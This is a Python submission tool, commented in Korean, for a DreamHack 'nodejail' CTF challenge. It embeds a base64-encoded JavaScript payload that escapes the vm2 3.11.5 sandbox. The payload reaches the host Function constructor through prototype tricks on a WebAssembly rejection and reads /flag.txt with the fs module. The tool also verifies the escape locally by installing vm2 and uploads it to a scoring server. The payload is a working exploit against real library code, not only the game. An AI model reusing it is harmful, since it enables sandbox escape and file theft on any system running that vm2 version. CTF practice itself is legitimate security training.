#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""nodejail KotH — 올인원 제출기 (단일 파일).

이 파일 하나만 있으면 된다. 페이로드는 내장돼 있고(269 bytes),
옆에 payload.js 가 있으면 그걸 우선 쓴다(골프 계속할 때 편하라고).

사용법:
    python3 koth.py                 # 토큰을 안전하게(입력 숨김) 물어보고 제출
    python3 koth.py --token XXXX    # 토큰을 인자로
    KOTH_TOKEN=XXXX python3 koth.py # 토큰을 환경변수로
    python3 koth.py --payload a.js  # 다른 페이로드 파일로 제출
    python3 koth.py --verify        # 제출 전에 로컬에서 exploit 동작 확인(node+npm 필요)
    python3 koth.py --base URL      # 채점 서버 주소 바꾸기(기본: http://204.48.30.25:9000)
    python3 koth.py --dry-run       # 서버 전송 없이 페이로드/설정만 점검

종료코드: 0 성공, 1 사용/입력 오류, 2 네트워크 도달 불가, 3 서버가 제출 거부.
의존성 없음(표준 라이브러리만). Python 3.8+.
"""
import argparse
import base64
import getpass
import http.cookiejar
import json
import os
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request as U
import uuid

# payload.js (269 bytes) 를 base64 로 내장 — 파일이 깨지거나 없어도 동작.
EMBEDDED_B64 = (
    "Yz1CdWZmZXIuY2FsbDtDPWMuYmluZChjKTtwPSJfX3Byb3RvX18iO1c9V2ViQXNzZW1ibHku"
    "Y29tcGlsZVN0cmVhbWluZztXKCkuY2F0Y2goZT0+e0MoQyhjLl9fbG9va3VwU2V0dGVyX18s"
    "YyxwKSxDKEMoYy5fX2xvb2t1cEdldHRlcl9fLGMscCksZSksbnVsbCk7VygpLmNhdGNoKGU9"
    "PmUuY29uc3RydWN0b3IuY29uc3RydWN0b3JgY29uc29sZS5sb2cocHJvY2Vzcy5tYWluTW9k"
    "dWxlLnJlcXVpcmUoJ2ZzJykucmVhZEZpbGVTeW5jKCcvZmxhZy50eHQnKSsnJylgKCkpfSk="
)

DEFAULT_BASE = "http://204.48.30.25:9000"


def log(msg=""):
    print(msg, flush=True)


def load_payload(path_arg):
    """payload 바이트를 결정한다. 명시 경로 > 옆 payload.js > 내장."""
    here = os.path.dirname(os.path.abspath(__file__))
    candidates = []
    if path_arg:
        candidates.append(path_arg)
    else:
        candidates.append(os.path.join(here, "payload.js"))
    for p in candidates:
        if os.path.isfile(p):
            data = open(p, "rb").read()
            return data, p
    # 내장 폴백
    return base64.b64decode(EMBEDDED_B64), "(내장)"


def validate(data):
    if not data:
        return "payload 가 비었다."
    if b"\x00" in data:
        return "payload 에 null byte 가 있다 — 서버가 거부한다."
    return None


def verify_local(data):
    """로컬에서 vm2@3.11.5 로 돌려 flag 를 뽑는지 확인(선택)."""
    if not (have("node") and have("npm")):
        log("  [verify] node/npm 이 없어 로컬 검증을 건너뛴다.")
        return None
    work = tempfile.mkdtemp(prefix="koth-verify-")
    try:
        json.dump({"name": "v", "private": True, "dependencies": {"vm2": "3.11.5"}},
                  open(os.path.join(work, "package.json"), "w"))
        runner = (
            "'use strict'\n"
            "const { VM } = require('vm2')\n"
            "const src = require('fs').readFileSync(0,'utf8')\n"
            "const vm = new VM({ timeout: 2000 })\n"
            "try { vm.run(src) } catch (e) { process.stderr.write(String((e&&e.stack)||e)+'\\n') }\n"
        )
        open(os.path.join(work, "runner.js"), "w").write(runner)
        open(os.path.join(work, "flag.txt"), "w").write("DH{local-verify-canary}")
        local_src = data.replace(b"/flag.txt", b"flag.txt")
        log("  [verify] vm2@3.11.5 설치 중...")
        r = subprocess.run(["npm", "install", "--no-audit", "--no-fund", "--silent"],
                           cwd=work, capture_output=True, text=True)
        if r.returncode != 0:
            log("  [verify] npm install 실패 — 검증 건너뜀:\n" + r.stderr[-400:])
            return None
        r = subprocess.run(["node", "runner.js"], cwd=work, input=local_src,
                           capture_output=True)
        out = r.stdout.decode("utf-8", "replace").strip()
        ok = out == "DH{local-verify-canary}"
        log(f"  [verify] 출력={out!r}  -> {'OK (exploit 동작)' if ok else '불일치/실패'}")
        if not ok and r.stderr:
            log("  [verify] stderr:\n" + r.stderr.decode('utf-8', 'replace')[-400:])
        return ok
    finally:
        import shutil
        shutil.rmtree(work, ignore_errors=True)


def have(prog):
    from shutil import which
    return which(prog) is not None


def build_opener():
    cj = http.cookiejar.CookieJar()
    # 자체서명/사설 CA 환경(프록시) 대비: 표준 CA 번들을 쓰되, 없으면 기본.
    ctx = ssl.create_default_context()
    cafile = os.environ.get("REQUESTS_CA_BUNDLE") or os.environ.get("SSL_CERT_FILE")
    if cafile and os.path.isfile(cafile):
        try:
            ctx.load_verify_locations(cafile)
        except Exception:
            pass
    https = U.HTTPSHandler(context=ctx)
    return U.build_opener(U.HTTPCookieProcessor(cj), https)


def request(op, base, path, method="GET", obj=None, body=None, ctype=None, retries=4):
    h = {"User-Agent": "koth-submit"}
    if obj is not None:
        body = json.dumps(obj).encode()
        h["Content-Type"] = "application/json"
    elif ctype:
        h["Content-Type"] = ctype
    last = None
    for attempt in range(retries):
        try:
            x = op.open(U.Request(base + path, data=body, headers=h, method=method), timeout=30)
            return x.status, x.read()
        except urllib.error.HTTPError as e:
            # HTTP 응답이 왔다 = 도달은 성공. 재시도 안 함.
            return e.code, e.read()
        except (urllib.error.URLError, socket.timeout, TimeoutError, ConnectionError) as e:
            last = e
            if attempt < retries - 1:
                wait = 2 ** (attempt + 1)
                log(f"  네트워크 오류({e}). {wait}s 후 재시도 {attempt + 2}/{retries}...")
                time.sleep(wait)
    raise ConnectionError(str(last))


def main():
    ap = argparse.ArgumentParser(description="nodejail KotH 올인원 제출기")
    ap.add_argument("--token", help="DreamHack 토큰(미지정 시 안전하게 입력받음)")
    ap.add_argument("--payload", help="제출할 .js 경로(기본: 옆 payload.js, 없으면 내장)")
    ap.add_argument("--base", default=os.environ.get("KOTH_BASE", DEFAULT_BASE),
                    help=f"채점 서버 주소(기본 {DEFAULT_BASE})")
    ap.add_argument("--verify", action="store_true", help="제출 전 로컬 exploit 검증")
    ap.add_argument("--dry-run", action="store_true", help="전송 없이 점검만")
    args = ap.parse_args()

    data, src = load_payload(args.payload)
    err = validate(data)
    if err:
        log("✗ " + err)
        return 1
    log(f"페이로드: {src} ({len(data)} bytes)")
    log("  " + data.decode("utf-8", "replace"))

    if args.verify:
        log("로컬 검증:")
        res = verify_local(data)
        if res is False:
            log("✗ 로컬에서 exploit 이 flag 를 못 뽑았다. 제출 중단.")
            return 1

    if args.dry_run:
        log(f"[dry-run] 서버 {args.base} 로 전송하지 않고 종료.")
        return 0

    token = args.token or os.environ.get("KOTH_TOKEN")
    if not token:
        try:
            token = getpass.getpass("DreamHack 토큰(입력 숨김): ").strip()
        except (EOFError, KeyboardInterrupt):
            log("\n✗ 토큰 입력 취소.")
            return 1
    if not token:
        log("✗ 토큰이 비었다.")
        return 1

    op = build_opener()

    log(f"로그인 → {args.base}/login")
    try:
        s, _ = request(op, args.base, "/login", "POST", obj={"token": token})
    except ConnectionError as e:
        log(f"✗ 서버에 도달 못 함: {e}")
        log("  이 머신에서 채점 서버로 아웃바운드가 막혀 있다. 문제 네트워크/로컬에서 실행해라.")
        return 2
    if s != 200:
        log(f"✗ 로그인 실패: HTTP {s} (토큰 확인)")
        return 3
    log("  로그인 OK (쿠키 세션 확보)")

    bnd = "----b" + uuid.uuid4().hex
    multipart = b"\r\n".join([
        ("--" + bnd).encode(),
        b'Content-Disposition: form-data; name="file"; filename="payload.js"',
        b"Content-Type: text/javascript",
        b"",
        data,
        ("--" + bnd + "--").encode(),
        b"",
    ])
    log(f"제출 → {args.base}/submit")
    try:
        s, rb = request(op, args.base, "/submit", "POST", body=multipart,
                        ctype="multipart/form-data; boundary=" + bnd)
    except ConnectionError as e:
        log(f"✗ 제출 중 네트워크 오류: {e}")
        return 2
    body = rb.decode("utf-8", "replace")
    log(f"  SUBMIT HTTP {s}: {body}")

    try:
        s2, rb2 = request(op, args.base, "/me/submissions")
        log(f"  내 제출내역: {rb2.decode('utf-8', 'replace')}")
    except ConnectionError:
        pass

    if 200 <= s < 300:
        log("✓ 제출 완료.")
        return 0
    log("✗ 서버가 제출을 거부했다(위 응답 참고).")
    return 3


if __name__ == "__main__":
    sys.exit(main())
